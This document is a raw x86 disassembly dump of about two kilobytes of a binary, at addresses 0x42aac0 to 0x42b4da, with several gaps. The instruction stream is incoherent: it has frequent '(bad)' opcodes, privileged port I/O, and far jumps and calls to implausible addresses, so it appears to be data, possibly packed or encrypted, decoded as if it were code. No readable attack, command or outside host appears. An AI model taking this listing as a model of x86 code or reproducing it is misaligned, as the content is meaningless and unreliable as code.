  42aac0:	clc    
  42aac1:	ror    bh,1
  42aac3:	scas   eax,DWORD PTR es:[edi]
  42aac4:	out    dx,al
  42aac5:	or     ebx,DWORD PTR [ebx]
  42aac7:	jnp    0x42aaf3
  42aac9:	push   esp
  42aaca:	outs   dx,BYTE PTR ds:[esi]
  42aacb:	jo     0x42ab11
  42aacd:	inc    edx
  42aace:	cld    
  42aacf:	jge    0x42aa96
  42aad1:	mov    ebx,0x359362c1
  42aad6:	xchg   ch,ch
  42aad8:	pop    edx
  42aad9:	push   es
  42aada:	or     eax,0xaab8e2d
  42aadf:	mov    eax,0xd7f93fba
  42aae4:	jg     0x42aac7
  42aae6:	pop    ebp
  42aae7:	leave  
  42aae8:	mov    ds:0x7a8dacb6,al
  42aaed:	inc    eax
  42aaee:	ss and eax,0xab01bc56
  42aaf4:	jns    0x42aae3
  42aaf6:	shl    BYTE PTR [edx+ebp*8+0x5bfa7c64],cl
  42aafd:	jo     0x42aab1
  42aaff:	cmp    dl,BYTE PTR [edi-0x3e]
  42ab02:	mov    ebp,edi
  42ab04:	mov    esi,edi
  42ab06:	fnstenv [ebx-0xc]
  42ab09:	mov    al,ds:0x34c2e86b
  42ab0e:	add    al,0x7a
  42ab10:	cwde   
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	stc    
  42ab81:	jg     0x42ab47
  42ab83:	ins    BYTE PTR es:[edi],dx
  42ab84:	fwait
  42ab85:	leave  
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0x3b000001
  42ab8d:	and    al,0xf4
  42ab8f:	sbb    dl,BYTE PTR [esi+0x3d]
  42ab92:	sub    eax,0xf7f2ee5d
  42ab97:	adc    DWORD PTR [ebp+0x30],ebp
  42ab9a:	or     bl,dl
  42ab9c:	dec    ecx
  42ab9d:	mul    DWORD PTR [ecx+0x6f1c89f8]
  42aba3:	fs dec ebp
  42aba5:	(bad)  
  42aba6:	fwait
  42aba7:	test   DWORD PTR [edi-0x55],eax
  42abaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abab:	mov    esi,0x5a459a67
  42abb0:	cs std 
  42abb2:	(bad)
  42abb6:	sbb    ebx,ebx
  42abb8:	add    eax,0x7331c5c
  42abbd:	lea    esp,[ecx]
  42abbf:	xor    BYTE PTR [ecx],bh
  42abc1:	add    al,0xb1
  42abc3:	call   0x6ef9:0x8ed9ee18
  42abca:	mov    al,0x8b
  42abcc:	icebp  
  42abcd:	mov    eax,edx
  42abcf:	das    
  42abd0:	scas   al,BYTE PTR es:[edi]
  42abd1:	pop    ecx
  42abd2:	jno    0x42ac4e
  42abd4:	inc    esi
  42abd5:	push   ss
  42abd6:	inc    ebp
  42abd7:	out    0xe3,eax
  42abd9:	mov    cl,0x80
  42abdb:	mov    BYTE PTR [edx],dh
  42abdd:	mov    eax,ds:0xee9c3255
  42abe2:	cwde   
  42abe3:	and    dl,0x96
  42abe6:	lds    esp,FWORD PTR [edx+0x42d6c19]
  42abec:	mov    WORD PTR [eax+0x64c983e3],es
  42abf2:	ins    BYTE PTR es:[edi],dx
  42abf3:	push   eax
  42abf4:	mov    ebx,0x8b86a89b
  42abf9:	and    DWORD PTR [ebx],0xd0b81c27
  42abff:	xchg   edi,eax
  42ac00:	push   eax
  42ac01:	dec    esi
  42ac02:	lock push ebp
  42ac04:	lock (bad) 
  42ac06:	xor    edi,ebx
  42ac08:	jmp    0x42ac0d
  42ac0a:	(bad)  
  42ac0b:	pop    ebp
  42ac0c:	mov    BYTE PTR es:[eax+0x7],bl
  42ac10:	pop    esi
  42ac11:	outs   dx,BYTE PTR ds:[esi]
  42ac12:	push   edx
  42ac13:	stos   BYTE PTR es:[edi],al
  42ac14:	xor    al,0xef
  42ac16:	adc    eax,DWORD PTR [edx-0x3]
  42ac19:	pop    ebp
  42ac1a:	sub    DWORD PTR [edi+0x6db851eb],edi
  42ac20:	and    ch,BYTE PTR [edi+edi*4-0x6f]
  42ac24:	test   BYTE PTR [eax+0x70],ch
  42ac27:	dec    ecx
  42ac28:	and    eax,0xf39978b4
  42ac2d:	cwde   
  42ac2e:	shl    BYTE PTR [ecx+0x1d],1
  42ac31:	jle    0x42ac8a
  42ac33:	scas   al,BYTE PTR es:[edi]
  42ac34:	sub    eax,DWORD PTR [ecx+0x3c32d52]
  42ac3a:	aad    0x42
  42ac3c:	add    al,0x85
  42ac3e:	(bad)  
  42ac40:	dec    ebp
  42ac41:	add    eax,DWORD PTR [esi+0x323e4265]
  42ac47:	pop    ds
  42ac48:	inc    ebp
  42ac49:	add    BYTE PTR [ebx+0x1d],bh
  42ac4c:	(bad)  
  42ac4d:	mov    esp,0x8d6b3a97
  42ac52:	scas   al,BYTE PTR es:[edi]
  42ac53:	sub    al,0x7a
  42ac55:	lds    esi,FWORD PTR [eax+edx*8+0x2734a7ab]
  42ac5c:	gs sahf 
  42ac5e:	push   es
  42ac5f:	fdiv   QWORD PTR [ebx]
  42ac61:	hlt    
  42ac62:	lea    edi,[ecx-0xb]
  42ac65:	lea    ebx,[eax-0x2a]
  42ac68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac69:	jp     0x42ac3c
  42ac6b:	clc    
  42ac6c:	inc    edx
  42ac6d:	jae    0x42ac15
  42ac6f:	add    dl,BYTE PTR [bp+si-0x55]
  42ac73:	sbb    eax,0x8c99433d
  42ac78:	leave  
  42ac79:	sbb    eax,0x62affd1b
  42ac7e:	outs   dx,BYTE PTR ds:[esi]
  42ac7f:	or     ebx,edx
  42ac81:	jp     0x42acc5
  42ac83:	ror    BYTE PTR [edi+0x8],1
  42ac86:	aam    0x24
  42ac88:	pop    ebp
  42ac89:	icebp  
  42ac8a:	mov    ds:0x2bc61efb,eax
  42ac8f:	jne    0x42accb
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	mov    eax,ds:0xa032e4f6
  42ad05:	retf   0x1
  42ad08:	add    eax,0xd7000001
  42ad0d:	mov    ds:0xe7b45241,al
  42ad12:	je     0x42ad7b
  42ad14:	mov    esi,0x5f20b7ba
  42ad19:	lock rcr dl,1
  42ad1c:	repz icebp 
  42ad1e:	jo     0x42ad20
  42ad20:	inc    esp
  42ad21:	mov    esi,DWORD PTR [ebx+0x1c5b841d]
  42ad27:	(bad)  
  42ad28:	sahf   
  42ad29:	push   0xffa22930
  42ad2e:	mov    ebx,0x4e5ac910
  42ad33:	jns    0x42ad16
  42ad35:	lahf   
  42ad36:	dec    edx
  42ad37:	outs   dx,DWORD PTR ds:[esi]
  42ad38:	adc    ch,BYTE PTR [ebx+0x7]
  42ad3b:	out    0x3c,al
  42ad3d:	stos   DWORD PTR es:[edi],eax
  42ad3e:	pop    esp
  42ad3f:	pop    ss
  42ad40:	push   edi
  42ad41:	push   cs
  42ad42:	dec    edx
  42ad43:	mov    bh,0x4
  42ad45:	jecxz  0x42ad09
  42ad47:	shr    DWORD PTR [ecx+0xd],0xaa
  42ad4b:	in     eax,0x7
  42ad4d:	or     bh,bl
  42ad4f:	inc    edi
  42ad50:	fisubr WORD PTR [eax]
  42ad52:	add    al,0x8d
  42ad54:	jmp    0xe593c359
  42ad59:	aam    0xf9
  42ad5b:	xlat   BYTE PTR ds:[ebx]
  42ad5c:	outs   dx,DWORD PTR ds:[esi]
  42ad5d:	or     eax,0x788208cd
  42ad62:	pop    ds
  42ad63:	clc    
  42ad64:	(bad)  
  42ad66:	lfs    esi,FWORD PTR [ebp+0x65bfeab8]
  42ad6d:	call   FWORD PTR [ebp-0x36]
  42ad70:	adc    bl,BYTE PTR [ebx+0xd64b80e]
  42ad76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad77:	cld    
  42ad78:	xor    dl,BYTE PTR [eax]
  42ad7a:	jecxz  0x42ad78
  42ad7c:	ficom  WORD PTR [ecx]
  42ad7e:	sti    
  42ad7f:	addr16 or eax,0x5c7cd681
  42ad85:	add    DWORD PTR [ebp+0x6ace8775],ecx
  42ad8b:	add    DWORD PTR [edx],ebx
  42ad8d:	cmp    edi,DWORD PTR [ecx+0x453ca897]
  42ad93:	and    DWORD PTR [ebx+0x29],0x48d88940
  42ad9a:	dec    edi
  42ad9b:	push   cs
  42ad9c:	out    dx,eax
  42ad9d:	cli    
  42ad9e:	(bad)  
  42ad9f:	lods   al,BYTE PTR ds:[esi]
  42ada0:	cs out 0x42,eax
  42ada3:	popf   
  42ada4:	into   
  42ada5:	and    DWORD PTR [ecx+edx*8+0x47],edx
  42ada9:	cmc    
  42adaa:	je     0x42ad8d
  42adac:	mov    eax,0x6854fd11
  42adb1:	sub    dl,0xc7
  42adb4:	mov    bh,0xa2
  42adb6:	and    dl,BYTE PTR [edi-0x7dc80e6b]
  42adbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42adbe:	dec    ebx
  42adbf:	and    edx,ebx
  42adc1:	xchg   BYTE PTR [ecx+0x77fc66e9],bl
  42adc7:	mov    DWORD PTR [esi+0x79],esi
  42adca:	xor    al,0x74
  42adcc:	mov    edi,DWORD PTR [esp+ebx*1]
  42adcf:	jbe    0x42ade0
  42add1:	xor    DWORD PTR [edi-0x9],0xffffff9d
  42add5:	add    BYTE PTR [eax+eax*4],ah
  42add8:	push   ecx
  42add9:	sub    BYTE PTR [ebp+0x37],bh
  42addc:	mov    ah,0xd9
  42adde:	shl    DWORD PTR [ebp+0x52],0x71
  42ade2:	push   ds
  42ade3:	fwait
  42ade4:	popf   
  42ade5:	dec    BYTE PTR [eax]
  42ade7:	fsubr  DWORD PTR [ebp-0x1037ba09]
  42aded:	adc    al,0x66
  42adef:	lock fsubr QWORD PTR ds:0x5f6d2a40
  42adf6:	mov    fs,WORD PTR [esi+0x1e5558f8]
  42adfc:	jmp    0xc1804cb1
  42ae01:	lahf   
  42ae02:	fnsave [eax]
  42ae04:	je     0x42adfe
  42ae06:	sub    ch,al
  42ae08:	adc    eax,0xb675253d
  42ae0d:	(bad)  
  42ae0e:	jmp    0x4324f0
	...
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	inc    edx
  42ae81:	pop    es
  42ae82:	rcr    BYTE PTR [eax-0x5b],1
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0x2000001
  42ae8d:	mov    esp,0x9f4a981c
  42ae92:	in     al,dx
  42ae93:	fld    TBYTE PTR [edx]
  42ae95:	adc    dl,al
  42ae97:	adc    dl,bl
  42ae99:	jb     0x42aee3
  42ae9b:	clc    
  42ae9c:	sbb    edi,ecx
  42ae9e:	sub    eax,0x784f6f3e
  42aea3:	cmp    al,0xc8
  42aea5:	jmp    0x31776999
  42aeaa:	out    0xb9,al
  42aeac:	aaa    
  42aead:	fisub  WORD PTR [esp+ecx*1-0x57df1d24]
  42aeb4:	xchg   ecx,eax
  42aeb5:	test   DWORD PTR [edx],eax
  42aeb7:	ins    BYTE PTR es:[edi],dx
  42aeb8:	stos   DWORD PTR es:[edi],eax
  42aeb9:	mov    edi,0x4f398118
  42aebe:	sub    DWORD PTR ds:0xfa878497,edi
  42aec4:	xchg   DWORD PTR [esi-0x50],edx
  42aec7:	sbb    ebp,DWORD PTR [ebp-0x6b160fa5]
  42aecd:	add    DWORD PTR [ecx-0x52],ecx
  42aed0:	add    al,0xa
  42aed2:	jnp    0x42aeb9
  42aed4:	sbb    BYTE PTR [edx+0x32be567b],0xd6
  42aedb:	test   al,0x74
  42aedd:	adc    eax,0x1c970d09
  42aee2:	push   0xffffff93
  42aee4:	jg     0x42ae92
  42aee6:	cmc    
  42aee7:	ja     0x42aea7
  42aee9:	fsubr  st(3),st
  42aeeb:	(bad)  
  42aeec:	and    dl,BYTE PTR [edi]
  42aeee:	mov    dl,0xb1
  42aef0:	(bad)  
  42aef2:	mov    cs,WORD PTR [ebx+0x59]
  42aef5:	(bad)
  42aef8:	cdq    
  42aef9:	test   DWORD PTR [eax],ecx
  42aefb:	iret   
  42aefc:	inc    esi
  42aefd:	scas   al,BYTE PTR es:[edi]
  42aefe:	neg    BYTE PTR ds:0xd85a0257
  42af04:	mov    dh,0xd0
  42af06:	scas   eax,DWORD PTR es:[edi]
  42af07:	adc    al,0xfe
  42af09:	sahf   
  42af0a:	mov    bh,0x39
  42af0c:	(bad)  [edi]
  42af0e:	mov    bh,cl
  42af10:	jne    0x42aedc
  42af12:	jle    0x42aee3
  42af14:	das    
  42af15:	in     al,dx
  42af16:	and    DWORD PTR [ecx+0x51737e5c],esi
  42af1c:	or     al,0x96
  42af1e:	pop    eax
  42af1f:	clc    
  42af20:	pop    es
  42af21:	mov    BYTE PTR [ecx+0x8],0x47
  42af25:	shl    esi,1
  42af27:	sbb    esp,ebp
  42af29:	clc    
  42af2a:	lahf   
  42af2b:	and    al,0x54
  42af2d:	retf   
  42af2e:	and    ebx,esp
  42af30:	and    bl,BYTE PTR [ebp+0x77]
  42af33:	not    BYTE PTR [eax]
  42af35:	retf   0xe9d
  42af38:	ss mov edx,0x7cceb2cb
  42af3e:	jo     0x42aee5
  42af40:	mov    dh,bl
  42af42:	bound  edx,QWORD PTR [edx-0x7e]
  42af45:	out    dx,al
  42af46:	adc    al,0xc0
  42af49:	jecxz  0x42aefb
  42af4b:	push   ecx
  42af4c:	push   ebx
  42af4d:	ds retf 
  42af4f:	cmp    eax,esp
  42af51:	sub    dh,BYTE PTR [edx+0x769d1eb7]
  42af57:	outs   dx,BYTE PTR ds:[esi]
  42af58:	jle    0x42afb5
  42af5a:	xor    eax,0xc361cde4
  42af5f:	repz jbe 0x42aef5
  42af62:	adc    eax,0x1521f25f
  42af67:	hlt    
  42af68:	out    0x2f,al
  42af6a:	div    DWORD PTR [ebx+0x3bc65b85]
  42af70:	call   0xe253cdcc
  42af75:	jnp    0x42afa7
  42af77:	mov    WORD PTR [edi-0x4f9e015],cs
  42af7d:	test   BYTE PTR [esi+0x2dc3034],bh
  42af83:	sbb    DWORD PTR [esi],ecx
  42af85:	mov    dh,0xe9
  42af87:	outs   dx,BYTE PTR ds:[esi]
  42af88:	cmp    ecx,esp
  42af8a:	jecxz  0x42af9e
  42af8c:	stos   BYTE PTR es:[edi],al
  42af8d:	mov    ecx,0x295b0
	...
  42aff2:	add    BYTE PTR [eax],al
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	pop    ecx
  42b001:	fmul   st,st(4)
  42b003:	sbb    DWORD PTR [edx+0x50001cc],ebp
  42b009:	add    DWORD PTR [eax],eax
  42b00b:	add    BYTE PTR [ebx-0x16cd7cad],bl
  42b011:	cld    
  42b012:	call   0x43b6491d
  42b017:	xchg   edx,eax
  42b018:	aad    0xb2
  42b01a:	mov    eax,ds:0x9f28791c
  42b01f:	icebp  
  42b020:	and    dl,BYTE PTR [ecx]
  42b022:	ret    0x23ef
  42b025:	cmc    
  42b026:	popf   
  42b027:	mov    edx,0x1214d1f8
  42b02c:	popa   
  42b02d:	bound  esp,QWORD PTR [edx-0x72a1bc21]
  42b033:	sbb    eax,0xf6447e0f
  42b038:	int3   
  42b039:	push   esp
  42b03a:	fld    QWORD PTR [ecx+0x3187404b]
  42b040:	stc    
  42b041:	jg     0x42b044
  42b043:	imul   ebp,esi,0x76f5f6f2
  42b049:	daa    
  42b04a:	call   0x17943066
  42b04f:	dec    eax
  42b050:	test   BYTE PTR [ecx+eax*1],0x34
  42b054:	(bad)  
  42b055:	cmp    al,0x2
  42b057:	outs   dx,BYTE PTR ds:[esi]
  42b058:	xchg   DWORD PTR [edi-0x5a],eax
  42b05b:	add    esi,esi
  42b05d:	test   eax,0x6df9c62c
  42b062:	adc    dh,BYTE PTR [ecx+0x269ddedc]
  42b068:	xchg   edx,eax
  42b069:	jae    0x42b022
  42b06b:	pop    ebp
  42b06c:	scas   al,BYTE PTR es:[edi]
  42b06d:	sbb    al,0xf4
  42b06f:	mul    DWORD PTR [edx]
  42b071:	mov    esi,0x7fa5e417
  42b076:	js     0x42b048
  42b078:	lea    ebp,[edx-0x61]
  42b07b:	clc    
  42b07c:	mov    WORD PTR [edi+0x13],cs
  42b07f:	nop
  42b080:	and    bh,dh
  42b082:	jmp    0x4b8aa681
  42b087:	retf   0xe6d5
  42b08a:	mov    ds:0x7630d85a,eax
  42b08f:	mov    DWORD PTR [edx-0x3d],edx
  42b092:	inc    ebp
  42b093:	jne    0x42b0df
  42b095:	pushf  
  42b096:	int    0xb7
  42b098:	pusha  
  42b099:	xor    dh,BYTE PTR [ecx+edi*8+0x5b62ac15]
  42b0a0:	cmp    dh,bl
  42b0a2:	imul   edx,eax,0x2a
  42b0a5:	(bad)  
  42b0a6:	push   edi
  42b0a7:	pushf  
  42b0a8:	mov    cl,0xb
  42b0aa:	out    dx,al
  42b0ab:	inc    ebx
  42b0ac:	ss cs lock jmp 0x42b0d7
  42b0b1:	aaa    
  42b0b2:	imul   esi,DWORD PTR [esi+0x3d67302f],0xffffff90
  42b0b9:	sub    ebx,DWORD PTR [edx+ebp*1-0x211e7f13]
  42b0c0:	push   ecx
  42b0c1:	cmp    DWORD PTR cs:[eax],ecx
  42b0c4:	addr16 add esi,edi
  42b0c7:	out    dx,al
  42b0c8:	inc    ecx
  42b0c9:	xor    dh,BYTE PTR [esi+ebp*2]
  42b0cc:	outs   dx,BYTE PTR ds:[esi]
  42b0cd:	add    eax,DWORD PTR es:[eax+0x7a6d4cdf]
  42b0d4:	cmp    eax,0x689367d3
  42b0d9:	pop    ebp
  42b0da:	pop    esp
  42b0db:	mov    bh,0xf2
  42b0dd:	xor    dl,BYTE PTR [edx]
  42b0df:	stc    
  42b0e0:	jmp    ebp
  42b0e2:	lds    edx,FWORD PTR [ebp-0x2b31c900]
  42b0e8:	xlat   BYTE PTR ds:[ebx]
  42b0e9:	pop    es
  42b0ea:	push   ss
  42b0eb:	and    al,0x0
  42b0ed:	mov    ch,0xb9
  42b0ef:	push   cs
  42b0f0:	fmul   DWORD PTR [ecx+0x2e]
  42b0f3:	cmp    DWORD PTR [edx+0x66],ecx
  42b0f6:	lods   al,BYTE PTR ds:[esi]
  42b0f7:	pop    eax
  42b0f8:	inc    esp
  42b0f9:	sub    al,0x3b
  42b0fb:	lods   eax,DWORD PTR ds:[esi]
  42b0fc:	ins    BYTE PTR es:[edi],dx
  42b0fd:	test   ebx,ebp
  42b0ff:	je     0x42b089
  42b101:	mov    bl,0x9f
  42b103:	fwait
  42b104:	xrelease xchg DWORD PTR [edi],ebx
  42b107:	cmp    ebp,DWORD PTR [esi+0x64]
  42b10a:	test   BYTE PTR [ebp-0x4a7068f4],cl
  42b110:	xor    BYTE PTR [eax],al
	...
  42b172:	add    BYTE PTR [eax],al
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	mov    BYTE PTR [ebx],ch
  42b182:	push   ecx
  42b183:	xchg   esi,eax
  42b184:	scas   eax,DWORD PTR es:[edi]
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0x98000001,al
  42b18d:	cmp    eax,0xb5926faf
  42b192:	nop
  42b193:	(bad)
  42b197:	sub    eax,DWORD PTR [eax+0x4702bdb7]
  42b19d:	lods   eax,DWORD PTR ds:[esi]
  42b19e:	rcr    DWORD PTR [edi],cl
  42b1a0:	inc    eax
  42b1a1:	dec    edi
  42b1a2:	push   ebp
  42b1a3:	(bad)  
  42b1a4:	ror    BYTE PTR [ecx],1
  42b1a6:	pusha  
  42b1a7:	pop    es
  42b1a8:	fsubr  DWORD PTR [ebx-0x6d]
  42b1ab:	or     eax,0x6cb76cfd
  42b1b0:	retf   0x9416
  42b1b3:	aaa    
  42b1b4:	lahf   
  42b1b5:	jl     0x42b140
  42b1b7:	int    0xe3
  42b1b9:	push   ecx
  42b1ba:	push   ecx
  42b1bb:	aad    0x57
  42b1bd:	push   0xffffffc0
  42b1bf:	inc    edx
  42b1c0:	mov    bh,0xff
  42b1c2:	jb     0x42b1a0
  42b1c4:	xchg   ecx,esp
  42b1c6:	fsincos 
  42b1c8:	xchg   edi,eax
  42b1c9:	add    eax,0x5384fb2c
  42b1ce:	lahf   
  42b1cf:	add    ch,BYTE PTR [ebx]
  42b1d1:	fisub  WORD PTR [ebx-0x51]
  42b1d4:	fwait
  42b1d5:	mov    es,WORD PTR ss:[edx]
  42b1d8:	mov    edx,ebx
  42b1da:	std    
  42b1db:	or     ebx,edi
  42b1dd:	gs mov cl,0xea
  42b1e0:	in     al,0x50
  42b1e2:	adc    cl,BYTE PTR ds:0x9603f8a5
  42b1e8:	loop   0x42b214
  42b1ea:	or     DWORD PTR [ecx-0x46],ebp
  42b1ed:	and    DWORD PTR [esi+0x25],edi
  42b1f0:	fs jmp 0x6b5b9b9a
  42b1f6:	pushf  
  42b1f7:	loopne 0x42b17d
  42b1f9:	cli    
  42b1fa:	ret    0xbc80
  42b1fd:	popf   
  42b1fe:	leave  
  42b1ff:	xor    al,0x14
  42b201:	pop    ebx
  42b202:	aad    0xc
  42b204:	loopne 0x42b1e7
  42b206:	xchg   esi,eax
  42b207:	sti    
  42b208:	out    dx,eax
  42b209:	dec    eax
  42b20a:	cld    
  42b20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b20c:	cmc    
  42b20d:	mov    BYTE PTR [edx+edi*4-0x5b],ah
  42b211:	jp     0x42b246
  42b213:	adc    dl,bl
  42b215:	test   BYTE PTR ds:0x5057f2d9,ah
  42b21b:	jbe    0x42b1f1
  42b21d:	cmp    ecx,DWORD PTR [esi]
  42b21f:	mov    ?,WORD PTR [eax-0xe7269af]
  42b225:	or     DWORD PTR [ecx],0x3e
  42b228:	cmp    al,0x24
  42b22a:	pop    edi
  42b22b:	and    BYTE PTR [ebx],al
  42b22d:	sbb    al,0x3c
  42b22f:	mov    ch,0x52
  42b231:	mov    ds:0xe989fddd,al
  42b236:	std    
  42b237:	pop    esi
  42b238:	lock sbb ch,BYTE PTR [ebx-0x1407a851]
  42b23f:	mov    esp,0x4af95d12
  42b244:	add    WORD PTR [ebp+0x2b7ebb35],bp
  42b24b:	nop
  42b24c:	xor    BYTE PTR [ecx+0x2e],cl
  42b24f:	mul    bl
  42b251:	(bad)  
  42b252:	je     0x42b1d8
  42b254:	loope  0x42b1dc
  42b256:	out    0xd0,al
  42b258:	mov    edi,0xc4ae1bb5
  42b25d:	das    
  42b25e:	jmp    0x1ea76e0d
  42b263:	sbb    dl,cl
  42b265:	leave  
  42b266:	xor    al,0x3c
  42b268:	and    BYTE PTR [ecx],al
  42b26a:	stos   DWORD PTR es:[edi],eax
  42b26b:	in     al,dx
  42b26c:	sahf   
  42b26d:	mov    DWORD PTR [ebp-0x79],ecx
  42b270:	popf   
  42b271:	ins    DWORD PTR es:[edi],dx
  42b272:	mov    esi,0x901a43a8
  42b277:	add    eax,0x9b85c963
  42b27c:	call   0x2d2aea5a
  42b281:	mov    edx,0xa2caac1e
  42b286:	and    DWORD PTR [edi+0x1fb1939],eax
  42b28c:	dec    esi
  42b28d:	adc    DWORD PTR [edx],0x3fa3
	...
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x88738e65
  42b301:	ret    0x5a2e
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0x49000001
  42b30d:	repnz push 0x5403ebc2
  42b313:	sbb    al,BYTE PTR [edx+eax*2-0x2f0fcb1f]
  42b31a:	xor    BYTE PTR [eax],0x36
  42b31d:	aam    0x20
  42b31f:	xchg   ecx,eax
  42b320:	pop    es
  42b321:	xchg   edx,eax
  42b322:	jp     0x42b2d4
  42b324:	xor    al,0x80
  42b326:	ins    DWORD PTR es:[edi],dx
  42b327:	mov    ds:0x8b40ec9e,al
  42b32c:	mov    esp,0x85bfc6a0
  42b331:	sahf   
  42b332:	loope  0x42b2ed
  42b334:	ret    0x6ace
  42b337:	stc    
  42b338:	push   ss
  42b339:	push   ebp
  42b33a:	mov    BYTE PTR [eax+0x104bd1f9],0x44
  42b341:	jo     0x42b330
  42b343:	add    eax,0x5a032ddb
  42b348:	mov    bh,0xc9
  42b34a:	popf   
  42b34b:	jmp    0xa1dbb84c
  42b350:	push   ds
  42b351:	mov    ds:0xecfeceb1,eax
  42b356:	and    al,BYTE PTR [esi+0x19f5e3]
  42b35c:	cmp    bl,BYTE PTR [esp+eiz*8]
  42b35f:	fidivr WORD PTR [edi+0x42]
  42b362:	jb     0x42b3b9
  42b364:	test   DWORD PTR [ebx+0x27743b8d],0x2238eca5
  42b36e:	mov    ds:0xe5234fda,eax
  42b373:	inc    eax
  42b374:	xchg   eax,ecx
  42b376:	fmul   st,st(3)
  42b378:	push   es
  42b379:	test   eax,0x3fa81c7b
  42b37e:	ffree  st(6)
  42b380:	sahf   
  42b381:	lods   al,BYTE PTR ds:[esi]
  42b382:	jecxz  0x42b316
  42b384:	and    DWORD PTR [edi+0x24],0xffffffb6
  42b388:	shl    dl,0x84
  42b38b:	shr    BYTE PTR [eax+0x195b8db],0x23
  42b392:	jge    0x42b401
  42b394:	cmp    DWORD PTR [edx],ebp
  42b396:	xor    ah,ch
  42b398:	cmp    DWORD PTR [edi-0x57],esp
  42b39b:	ins    DWORD PTR es:[edi],dx
  42b39c:	outs   dx,BYTE PTR ds:[esi]
  42b39d:	fs sti 
  42b39f:	xchg   esi,eax
  42b3a0:	adc    ah,BYTE PTR [esi]
  42b3a2:	sti    
  42b3a3:	adc    DWORD PTR [edx],eax
  42b3a5:	add    eax,0x3a0e4622
  42b3aa:	aad    0xe0
  42b3ac:	push   ss
  42b3ad:	jge    0x42b416
  42b3af:	sub    DWORD PTR [esi-0x5ea4aac0],esi
  42b3b5:	push   0xeb74e40
  42b3ba:	cmp    al,0xf3
  42b3bc:	pop    ebp
  42b3bd:	inc    esp
  42b3be:	leave  
  42b3bf:	or     BYTE PTR [ebx+0x56],dl
  42b3c2:	in     al,dx
  42b3c3:	test   bh,0x73
  42b3c6:	fmul   QWORD PTR [ebx-0x65dd1ee8]
  42b3cc:	out    0xe0,eax
  42b3ce:	sbb    BYTE PTR [ebx],ah
  42b3d0:	add    eax,0x41072859
  42b3d5:	xchg   BYTE PTR [ebx+0x59],ah
  42b3d8:	push   DWORD PTR [ebx-0x52]
  42b3db:	mov    ds:0xcecf2829,al
  42b3e0:	or     cl,BYTE PTR [eax+0x1b8fef65]
  42b3e6:	test   al,0x32
  42b3e8:	enter  0x831a,0x0
  42b3ec:	xchg   esp,eax
  42b3ed:	add    dl,bl
  42b3ef:	lock push 0x1c130ab5
  42b3f5:	sbb    edi,ecx
  42b3f7:	iret   
  42b3f8:	sub    DWORD PTR [ecx],ebp
  42b3fa:	(bad)  
  42b3fb:	outs   dx,BYTE PTR ds:[esi]
  42b3fc:	mov    al,0xa9
  42b3fe:	loope  0x42b3df
  42b400:	sbb    dl,BYTE PTR [edx-0x52a1b148]
  42b406:	mov    al,ds:0xf4b6448d
  42b40b:	in     al,0x14
  42b40d:	loope  0x42b3f2
  42b40f:	cmp    esi,esi
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [esi],eax
  42b481:	pop    ebx
  42b482:	(bad)  
  42b483:	jmp    0x105:0x1cfb9
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	and    BYTE PTR ds:0x84a88fb7,al
  42b492:	mov    dh,BYTE PTR [ebx+0x26]
  42b495:	xchg   BYTE PTR [edx+0xf],dh
  42b498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b499:	sbb    al,0x22
  42b49b:	pop    edi
  42b49c:	pusha  
  42b49d:	jmp    0xfd05d9ba
  42b4a2:	int3   
  42b4a3:	xchg   ah,al
  42b4a5:	test   DWORD PTR [edx-0x100e60ca],edi
  42b4ab:	cmc    
  42b4ac:	fsub   st(1),st
  42b4ae:	ins    DWORD PTR es:[edi],dx
  42b4af:	fldenv [ebp-0x6599fd2e]
  42b4b5:	in     al,dx
  42b4b6:	popf   
  42b4b7:	and    edx,DWORD PTR [ebx-0x51b7e525]
  42b4bd:	lods   eax,DWORD PTR ds:[esi]
  42b4be:	aaa    
  42b4bf:	jno    0x42b515
  42b4c1:	inc    ebx
  42b4c2:	jecxz  0x42b511
  42b4c4:	popf   
  42b4c5:	push   edi
  42b4c6:	pop    ebp
  42b4c7:	jb     0x42b51f
  42b4c9:	shr    BYTE PTR [eax-0x4e],1
  42b4cc:	gs mov esi,0xac787abe
  42b4d2:	jmp    0xd933:0xedaff313
  42b4d9:	outs   dx,BYTE PTR ds:[esi]
  42b4da:	ja     0x42b48c
